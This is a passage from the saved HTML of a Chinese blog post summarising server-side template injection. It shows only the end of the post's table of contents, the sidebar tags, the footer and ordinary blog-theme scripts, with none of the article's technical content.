href="https://mrking00.github.io/2020/10/12/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5ssti%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#%E5%AE%9E%E4%BE%8B%E4%B8%80" rel="nofollow">实例一：</a></li><li class="h4_nav"><a href="https://mrking00.github.io/2020/10/12/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5ssti%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#%E5%AE%9E%E4%BE%8B%E4%BA%8C" rel="nofollow">实例二：</a></li><li class="h3_nav"><a href="https://mrking00.github.io/2020/10/12/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5ssti%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#3-java-%E5%AE%9E%E4%BE%8B" rel="nofollow">3. JAVA 实例：</a></li><li class="h4_nav"><a href="https://mrking00.github.io/2020/10/12/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5ssti%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#%E5%AE%9E%E4%BE%8B%E4%B8%80-1" rel="nofollow">实例一：</a></li><li class="h4_nav"><a href="https://mrking00.github.io/2020/10/12/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5ssti%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#%E5%AE%9E%E4%BE%8B%E4%BA%8C-1" rel="nofollow">实例二：</a></li><li class="h2_nav"><a href="https://mrking00.github.io/2020/10/12/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5ssti%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#0x05-%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95" rel="nofollow">0X05 检测方法</a></li><li class="h2_nav"><a href="https://mrking00.github.io/2020/10/12/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5ssti%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#0x06-%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF" rel="nofollow">0X06 攻击思路</a></li><li class="h3_nav"><a href="https://mrking00.github.io/2020/10/12/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5ssti%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#1%E6%94%BB%E5%87%BB%E6%96%B9%E5%90%91" rel="nofollow">1.攻击方向：</a></li><li class="h3_nav"><a href="https://mrking00.github.io/2020/10/12/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5ssti%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#2%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95" rel="nofollow">2.攻击方法：</a></li><li class="h4_nav"><a href="https://mrking00.github.io/2020/10/12/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5ssti%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#1%E5%88%A9%E7%94%A8%E6%A8%A1%E6%9D%BF%E6%9C%AC%E8%BA%AB%E7%9A%84%E7%89%B9%E6%80%A7%E8%BF%9B%E8%A1%8C%E6%94%BB%E5%87%BB" rel="nofollow">1.利用模板本身的特性进行攻击</a></li><li class="h4_nav"><a href="https://mrking00.github.io/2020/10/12/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5ssti%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#1%E5%88%A9%E7%94%A8%E6%A8%A1%E6%9D%BF%E6%9C%AC%E8%BA%AB%E7%9A%84%E7%89%B9%E6%80%A7%E8%BF%9B%E8%A1%8C%E6%94%BB%E5%87%BB-1" rel="nofollow">1.利用模板本身的特性进行攻击</a></li><li class="h5_nav"><a href="https://mrking00.github.io/2020/10/12/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5ssti%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#1smarty" rel="nofollow">1.Smarty</a></li><li class="h5_nav"><a href="https://mrking00.github.io/2020/10/12/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5ssti%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#2twig" rel="nofollow">2.Twig</a></li><li class="h5_nav"><a href="https://mrking00.github.io/2020/10/12/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5ssti%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#3freemarker" rel="nofollow">3.freeMarker</a></li><li class="h4_nav"><a href="https://mrking00.github.io/2020/10/12/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5ssti%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#2%E5%88%A9%E7%94%A8%E6%A1%86%E6%9E%B6%E6%9C%AC%E8%BA%AB%E7%9A%84%E7%89%B9%E6%80%A7%E8%BF%9B%E8%A1%8C%E6%94%BB%E5%87%BB" rel="nofollow">2.利用框架本身的特性进行攻击</a></li><li class="h5_nav"><a href="https://mrking00.github.io/2020/10/12/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5ssti%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#1django" rel="nofollow">1.Django</a></li><li class="h5_nav"><a href="https://mrking00.github.io/2020/10/12/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5ssti%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#2flaskjinja2" rel="nofollow">2.Flask/Jinja2</a></li><li class="h5_nav"><a href="https://mrking00.github.io/2020/10/12/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5ssti%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#3tornado" rel="nofollow">3.Tornado</a></li><li class="h4_nav"><a href="https://mrking00.github.io/2020/10/12/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5ssti%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#2%E5%88%A9%E7%94%A8%E6%A8%A1%E8%AF%AD%E8%A8%80%E6%9C%AC%E8%BA%AB%E7%9A%84%E7%89%B9%E6%80%A7%E8%BF%9B%E8%A1%8C%E6%94%BB%E5%87%BB" rel="nofollow">2.利用模语言本身的特性进行攻击</a></li><li class="h5_nav"><a href="https://mrking00.github.io/2020/10/12/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5ssti%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#1python" rel="nofollow">1.Python</a></li><li class="h5_nav"><a href="https://mrking00.github.io/2020/10/12/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5ssti%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#2java" rel="nofollow">2.JAVA</a></li><li class="h2_nav"><a href="https://mrking00.github.io/2020/10/12/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5ssti%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#0x07-%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95" rel="nofollow">0X07 防御方法</a></li></ul>
                </div>
            </div>
        

    <!-- Sidebar Container -->
            <div class="
                col-lg-8 col-lg-offset-2
                col-md-10 col-md-offset-1
                sidebar-container">

                <!-- Featured Tags -->
                
                <section>
                    <hr class="hidden-sm hidden-xs">
                    <h5><a href="https://mrking00.github.io/tags/">FEATURED TAGS</a></h5>
                    <div class="tags">
        				
                            
        				
                            
                				<a href="https://mrking00.github.io/tags/#-web" title="-web" rel="15">
                                    -web
                                </a>
                            
        				
                            
                				<a href="https://mrking00.github.io/tags/#-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0" title="-学习笔记" rel="49">
                                    -学习笔记
                                </a>
                            
        				
                            
        				
                            
        				
                            
                				<a href="https://mrking00.github.io/tags/#-xss" title="-xss" rel="3">
                                    -xss
                                </a>
                            
        				
                            
        				
                            
        				
                            
                				<a href="https://mrking00.github.io/tags/#-MISC" title="-MISC" rel="2">
                                    -MISC
                                </a>
                            
        				
                            
                				<a href="https://mrking00.github.io/tags/#-%E6%9D%82%E9%A1%B9" title="-杂项" rel="2">
                                    -杂项
                                </a>
                            
        				
                            
        				
                            
        				
                            
        				
                            
        				
                            
                				<a href="https://mrking00.github.io/tags/#-sql%E6%B3%A8%E5%85%A5" title="-sql注入" rel="2">
                                    -sql注入
                                </a>
                            
        				
                            
        				
                            
        				
                            
                				<a href="https://mrking00.github.io/tags/#-PHP" title="-PHP" rel="6">
                                    -PHP
                                </a>
                            
        				
                            
        				
                            
        				
                            
        				
                            
                				<a href="https://mrking00.github.io/tags/#-ctf" title="-ctf" rel="2">
                                    -ctf
                                </a>
                            
        				
                            
                				<a href="https://mrking00.github.io/tags/#-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C" title="-命令执行" rel="2">
                                    -命令执行
                                </a>
                            
        				
                            
        				
                            
        				
                            
        				
                            
                				<a href="https://mrking00.github.io/tags/#-ssti" title="-ssti" rel="3">
                                    -ssti
                                </a>
                            
        				
                            
                				<a href="https://mrking00.github.io/tags/#-wp" title="-wp" rel="4">
                                    -wp
                                </a>
                            
        				
                            
        				
                            
        				
                            
        				
                            
        				
                            
        				
                            
        				
                            
        				
                            
        				
                            
                				<a href="https://mrking00.github.io/tags/#-java" title="-java" rel="2">
                                    -java
                                </a>
                            
        				
                            
        				
                            
        				
        			</div>
                </section>
                

                <!-- Friends Blog -->
                
                <hr>
                <h5>FRIENDS</h5>
                <ul class="list-inline">
                    
                        <li><a href="https://mrking00.github.io/2020/10/12/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5ssti%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1293863008@qq.com">邮箱</a></li>
                    
                        <li><a href="https://blog.csdn.net/weixin_43983332">csdn</a></li>
                    
                </ul>
                
            </div>
        </div>
    </div>
</article>






<!-- async load function -->
<script>
    function async(u, c) {
      var d = document, t = 'script',
          o = d.createElement(t),
          s = d.getElementsByTagName(t)[0];
      o.src = u;
      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
      s.parentNode.insertBefore(o, s);
    }
</script>
<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
<script>
    async("//cdnjs.cloudflare.com/ajax/libs/anchor-js/1.1.1/anchor.min.js",function(){
        // BY Fix:去除标题前的‘#’ issues:<https://github.com/qiubaiying/qiubaiying.github.io/issues/137>
        // anchors.options = {
        //   visible: 'always',
        //   placement: 'right',
        //   icon: '#'
        // };
        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
    })
</script>
<style>
    /* place left on bigger screen */
    @media all and (min-width: 800px) {
        .anchorjs-link{
            position: absolute;
            left: -0.75em;
            font-size: 1.1em;
            margin-top : -0.1em;
        }
    }
</style>


    <!-- Footer -->
<footer translate="no">
    <div class="container">
        <div class="row">
            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                <ul class="list-inline text-center">
                    
                    <!-- add jianshu add target = "_blank" to <a> by BY -->
                    
                    

                    <!-- add Weibo, Zhihu by Hux, add target = "_blank" to <a> by Hux -->
                    
                    


                    
                    
                    
                </ul>
                <p class="copyright text-muted">
                    Copyright © Mr_King Blog 2021
                    <br>
                    Theme on <a href="https://github.com/MrKing00/mrking00.github.io/.git">GitHub</a> |
                    <iframe style="margin-left: 2px; margin-bottom:-5px;" frameborder="0" scrolling="0" width="100px" height="20px" src="./模板注入SSTI漏洞总结 - Mr_king的博客 _ Mr_king Blog_files/github-btn.html">
                    </iframe>
                </p>
            </div>
        </div>
    </div>
</footer>

<!-- jQuery -->
<script src="./模板注入SSTI漏洞总结 - Mr_king的博客 _ Mr_king Blog_files/jquery.min.js.下载"></script>

<!-- Bootstrap Core JavaScript -->
<script src="./模板注入SSTI漏洞总结 - Mr_king的博客 _ Mr_king Blog_files/bootstrap.min.js.下载"></script>

<!-- Custom Theme JavaScript -->
<script src="./模板注入SSTI漏洞总结 - Mr_king的博客 _ Mr_king Blog_files/hux-blog.min.js.下载"></script>

<!-- Service Worker -->

<script type="text/javascript">
    if(navigator.serviceWorker){
        // For security reasons, a service worker can only control the pages that are in the same directory level or below it. That's why we put sw.js at ROOT level.
        navigator.serviceWorker
            .register('/sw.js')
            .then((registration) => {console.log('Service Worker Registered. ', registration)})
            .catch((error) => {console.log('ServiceWorker registration failed: ', error)})
    }
</script>



<!-- async load function -->
<script>
    function async(u, c) {
      var d = document, t = 'script',
          o = d.createElement(t),
          s = d.getElementsByTagName(t)[0];
      o.src = u;
      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
      s.parentNode.insertBefore(o, s);
    }
</script>

<!-- 
     Because of the native support for backtick-style fenced code blocks 
     right within the Markdown is landed in Github Pages, 
     From V1.6, There is no need for Highlight.js, 
     so Huxblog drops it officially.

     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
     - https://help.github.com/articles/creating-and-highlighting-code-blocks/ 
     - https://github.com/jneen/rouge/wiki/list-of-supported-languages-and-lexers   
-->
<!--
    <script>
        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
            hljs.initHighlightingOnLoad();
        })
    </script>
    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
-->


<!-- jquery.tagcloud.js -->
<script>
    // only load tagcloud.js in tag.html
    if($('#tag_cloud').length !== 0){
        async('/js/jquery.tagcloud.js',function(){
            $.fn.tagcloud.defaults = {
                //size: {start: 1, end: 1, unit: 'em'},
                color: {start: '#bbbbee', end: '#0085a1'},
            };
            $('#tag_cloud a').tagcloud();
        })
    }
</script>

<!--fastClick.js -->
<script>
    async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
        var $nav = document.querySelector("nav");
        if($nav) FastClick.attach($nav);
    })
</script>


<!-- Google Analytics -->



<!-- Baidu Tongji -->




<!-- Side Catalog -->

<script type="text/javascript">
    function generateCatalog (selector) {
        var P = $('div.post-container'),a,n,t,l,i,c;
        a = P.find('h1,h2,h3,h4,h5,h6');
        a.each(function () {
            n = $(this).prop('tagName').toLowerCase();
            i = "#"+$(this).prop('id');
            t = $(this).text();
            c = $('<a href="'+i+'" rel="nofollow">'+t+'</a>');
            l = $('<li class="'+n+'_nav"></li>').append(c);
            $(selector).append(l);
        });
        return true;    
    }

    generateCatalog(".catalog-body");

    // toggle side catalog
    $(".catalog-toggle").click((function(e){
        e.preventDefault();
        $('.side-catalog').toggleClass("fold")
    }))

    /*
     * Doc: https://github.com/davist11/jQuery-One-Page-Nav
     * Fork by Hux to support padding
     */
    async("/js/jquery.nav.js", function () {
        $('.catalog-body').onePageNav({
            currentClass: "active",
            changeHash: !1,
            easing: "swing",
            filter: "",
            scrollSpeed: 700,
            scrollOffset: 0,
            scrollThreshold: .2,
            begin: null,
            end: null,
            scrollChange: null,
            padding: 80
        });
    });
</script>





<!-- Image to hack wechat -->
<img src="./模板注入SSTI漏洞总结 - Mr_king的博客 _ Mr_king Blog_files/apple-touch-icon.png" width="0" height="0">
<!-- Migrate from head to bottom, no longer block render and still work -->




</body></html>